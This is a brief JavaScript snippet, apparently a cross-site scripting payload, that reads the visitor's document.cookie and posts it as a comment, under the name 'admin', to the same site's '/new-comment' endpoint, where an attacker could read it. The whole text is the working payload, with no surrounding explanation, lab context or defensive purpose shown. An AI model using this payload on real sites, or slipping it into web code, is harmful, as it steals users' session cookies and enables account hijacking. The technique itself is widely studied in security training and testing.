const data = new URLSearchParams()
data.append('name', 'admin')
data.append('comment', document.cookie)
fetch('/new-comment', {
  method: 'POST',
  body: data
})
